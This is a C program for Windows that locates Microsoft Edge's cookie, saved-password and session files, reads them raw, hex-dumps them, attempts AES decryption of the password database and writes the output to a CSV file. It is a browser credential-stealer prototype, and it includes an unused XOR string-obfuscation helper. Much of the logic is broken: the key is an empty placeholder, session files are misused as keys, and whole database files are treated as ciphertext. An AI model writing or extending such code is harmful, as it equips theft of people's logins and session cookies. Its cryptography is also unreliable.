#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>
#include <io.h>
#include <fcntl.h>
#include <wincrypt.h>
#include <bcrypt.h>

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0500
#endif

void decrypt(char *str) {
    while (*str) {
        *str = *str ^ 0xAA;
        str++;
    }
}

void write_to_csv(FILE *file, const char *type, const char *col1, const char *col2, const char *col3) {
    if (file == NULL) {
        fprintf(stderr, "File pointer is NULL\n");
        return;
    }
    fprintf(file, "%s,%s,%s,%s\n", type, col1, col2, col3);
    printf("Writing to CSV: %s, %s, %s, %s\n", type, col1, col2, col3);
}

BYTE* get_aes_key_from_os(int *key_len) {
    // This function should retrieve the AES key from the OS storage area.
    // For demonstration purposes, we'll use a hardcoded key.
    // Replace this with actual key retrieval logic.
    static BYTE key[32] = { /* 32-byte AES key */ };
    *key_len = sizeof(key);
    return key;
}

BYTE* aes_decrypt(const BYTE *enc_data, int enc_data_len, const BYTE *key, int key_len, int *dec_data_len) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbData = 0, cbKeyObject = 0, cbBlockLen = 0;
    PBYTE pbKeyObject = NULL, pbIV = NULL, pbOutput = NULL;

    // Open an algorithm handle
    if (!BCRYPT_SUCCESS(status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) {
        fprintf(stderr, "BCryptOpenAlgorithmProvider failed (0x%x)\n", status);
        goto cleanup;
    }

    // Calculate the size of the buffer to hold the KeyObject
    if (!BCRYPT_SUCCESS(status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0))) {
        fprintf(stderr, "BCryptGetProperty failed (0x%x)\n", status);
        goto cleanup;
    }

    // Allocate the key object
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (NULL == pbKeyObject) {
        fprintf(stderr, "HeapAlloc failed\n");
        goto cleanup;
    }

    // Calculate the block length for the IV
    if (!BCRYPT_SUCCESS(status = BCryptGetProperty(hAlg, BCRYPT_BLOCK_LENGTH, (PBYTE)&cbBlockLen, sizeof(DWORD), &cbData, 0))) {
        fprintf(stderr, "BCryptGetProperty failed (0x%x)\n", status);
        goto cleanup;
    }

    // Allocate a buffer for the IV. The buffer is consumed during the encrypt/decrypt process.
    pbIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbBlockLen);
    if (NULL == pbIV) {
        fprintf(stderr, "HeapAlloc failed\n");
        goto cleanup;
    }
    memset(pbIV, 0, cbBlockLen);

    // Generate the key from supplied input key bytes
    if (!BCRYPT_SUCCESS(status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, key_len, 0))) {
        fprintf(stderr, "BCryptGenerateSymmetricKey failed (0x%x)\n", status);
        goto cleanup;
    }

    // Determine the size of the buffer required for the decrypted data
    if (!BCRYPT_SUCCESS(status = BCryptDecrypt(hKey, (PBYTE)enc_data, enc_data_len, NULL, pbIV, cbBlockLen, NULL, 0, &cbData, BCRYPT_BLOCK_PADDING))) {
        fprintf(stderr, "BCryptDecrypt failed (0x%x)\n", status);
        goto cleanup;
    }

    pbOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbData);
    if (NULL == pbOutput) {
        fprintf(stderr, "HeapAlloc failed\n");
        goto cleanup;
    }

    // Decrypt the data
    if (!BCRYPT_SUCCESS(status = BCryptDecrypt(hKey, (PBYTE)enc_data, enc_data_len, NULL, pbIV, cbBlockLen, pbOutput, cbData, &cbData, BCRYPT_BLOCK_PADDING))) {
        fprintf(stderr, "BCryptDecrypt failed (0x%x)\n", status);
        HeapFree(GetProcessHeap(), 0, pbOutput);
        pbOutput = NULL;
        goto cleanup;
    }

    *dec_data_len = cbData;

cleanup:
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    if (hKey) BCryptDestroyKey(hKey);
    if (pbKeyObject) HeapFree(GetProcessHeap(), 0, pbKeyObject);
    if (pbIV) HeapFree(GetProcessHeap(), 0, pbIV);

    return pbOutput;
}

void read_cookies(const char *db_path, FILE *file) {
    int fd = _open(db_path, _O_RDONLY | _O_BINARY);
    if (fd == -1) {
        fprintf(stderr, "Failed to open database file: %s\n", db_path);
        return;
    }

    // Read the database file into memory
    _lseek(fd, 0, SEEK_END);
    long file_size = _tell(fd);
    _lseek(fd, 0, SEEK_SET);
    char *db_data = (char *)malloc(file_size);
    if (!db_data) {
        fprintf(stderr, "Memory allocation failed\n");
        _close(fd);
        return;
    }
    _read(fd, db_data, file_size);
    _close(fd);

    // Process the database file (simplified for demonstration purposes)
    // You would need to parse the SQLite database format here
    // For now, we'll just print the raw data
    printf("Database content:\n");
    for (long i = 0; i < file_size; i++) {
        printf("%02x ", (unsigned char)db_data[i]);
    }
    printf("\n");

    free(db_data);
}

void read_passwords(const char *db_path, FILE *file, const char *session_key_dir) {
    int fd = _open(db_path, _O_RDONLY | _O_BINARY);
    if (fd == -1) {
        fprintf(stderr, "Failed to open database file: %s\n", db_path);
        return;
    }

    // Read the database file into memory
    _lseek(fd, 0, SEEK_END);
    long file_size = _tell(fd);
    _lseek(fd, 0, SEEK_SET);
    char *db_data = (char *)malloc(file_size);
    if (!db_data) {
        fprintf(stderr, "Memory allocation failed\n");
        _close(fd);
        return;
    }
    _read(fd, db_data, file_size);
    _close(fd);

    // Process the database file (simplified for demonstration purposes)
    // You would need to parse the SQLite database format here
    // For now, we'll just print the raw data
    printf("Database content:\n");
    for (long i = 0; i < file_size; i++) {
        printf("%02x ", (unsigned char)db_data[i]);
    }
    printf("\n");

    // Read all session keys from the session key directory
    struct _finddata_t file_info;
    intptr_t handle;
    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*", session_key_dir);

    handle = _findfirst(search_path, &file_info);
    if (handle == -1) {
        fprintf(stderr, "Failed to find session key files\n");
        free(db_data);
        return;
    }

    do {
        if (!(file_info.attrib & _A_SUBDIR)) {
            char session_key_path[MAX_PATH];
            snprintf(session_key_path, MAX_PATH, "%s\\%s", session_key_dir, file_info.name);
            FILE *key_file = fopen(session_key_path, "rb");
            if (!key_file) {
                fprintf(stderr, "Failed to open session key file: %s\n", session_key_path);
                continue;
            }
            fseek(key_file, 0, SEEK_END);
            int key_len = ftell(key_file);
            fseek(key_file, 0, SEEK_SET);
            void *session_key = malloc(key_len);
            if (!session_key) {
                fprintf(stderr, "Memory allocation failed\n");
                fclose(key_file);
                continue;
            }
            fread(session_key, 1, key_len, key_file);
            fclose(key_file);

            // Print the session key to the console and output.csv
            printf("Session key length: %d\n", key_len);
            printf("Session key: ");
            for (int i = 0; i < key_len; i++) {
                printf("%02x ", ((unsigned char *)session_key)[i]);
            }
            printf("\n");

            fprintf(file, "Session Key,");
                        for (int i = 0; i < key_len; i++) {
                fprintf(file, "%02x", ((unsigned char *)session_key)[i]);
                if (i < key_len - 1) {
                    fprintf(file, " ");
                }
            }
            fprintf(file, "\n");

            // Assuming the database contains encrypted passwords, decrypt them using the session key
            // This is a simplified example; you would need to parse the database and extract the encrypted data
            // For now, we'll just demonstrate decryption with the session key

            int dec_data_len;
            BYTE *dec_password = aes_decrypt((const BYTE *)db_data, file_size, (const BYTE *)session_key, key_len, &dec_data_len);
            if (dec_password) {
                printf("Decrypted data length: %d\n", dec_data_len);
                printf("Decrypted data: ");
                for (int i = 0; i < dec_data_len; i++) {
                    printf("%02x ", dec_password[i]);
                }
                printf("\n");

                // Write decrypted data to CSV (for demonstration purposes)
                write_to_csv(file, "Decrypted Data", "N/A", "N/A", (const char *)dec_password);
                HeapFree(GetProcessHeap(), 0, dec_password);
            }

            free(session_key);
        }
    } while (_findnext(handle, &file_info) == 0);

    _findclose(handle);
    free(db_data);
}

void inspect_schema(const char *db_path) {
    int fd = _open(db_path, _O_RDONLY | _O_BINARY);
    if (fd == -1) {
        fprintf(stderr, "Failed to open database file: %s\n", db_path);
        return;
    }

    // Read the database file into memory
    _lseek(fd, 0, SEEK_END);
    long file_size = _tell(fd);
    _lseek(fd, 0, SEEK_SET);
    char *db_data = (char *)malloc(file_size);
    if (!db_data) {
        fprintf(stderr, "Memory allocation failed\n");
        _close(fd);
        return;
    }
    _read(fd, db_data, file_size);
    _close(fd);

    // Process the database file (simplified for demonstration purposes)
    // You would need to parse the SQLite database format here
    // For now, we'll just print the raw data
    printf("Database content:\n");
    for (long i = 0; i < file_size; i++) {
        printf("%02x ", (unsigned char)db_data[i]);
    }
    printf("\n");

    free(db_data);
}

void read_database(const char *db_path, void (*read_func)(const char *, FILE *, const char *), FILE *file, const char *session_key_dir) {
    printf("Reading database: %s\n", db_path);
    inspect_schema(db_path); // Inspect the schema before reading
    read_func(db_path, file, session_key_dir);
}

int main() {
    char edge_cookies[MAX_PATH];
    char edge_passwords[MAX_PATH];
    char session_key_dir[MAX_PATH];

    // Get paths for Edge
    snprintf(edge_cookies, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Cookies", getenv("LOCALAPPDATA"));
    snprintf(edge_passwords, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Login Data", getenv("LOCALAPPDATA"));
    snprintf(session_key_dir, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Sessions", getenv("LOCALAPPDATA"));

    // Print paths for verification
    printf("Edge cookies path: %s\n", edge_cookies);
    printf("Edge passwords path: %s\n", edge_passwords);
    printf("Session key directory: %s\n", session_key_dir);

    FILE *file = fopen("output.csv", "w");
    if (!file) {
        fprintf(stderr, "Cannot open output.csv for writing\n");
        return 1;
    }

    fprintf(file, "Type,Column1,Column2,Column3\n");

    printf("Reading Edge cookies and passwords...\n");
    read_database(edge_cookies, read_cookies, file, session_key_dir);
    read_database(edge_passwords, read_passwords, file, session_key_dir);

    fclose(file);

    return 0;
}
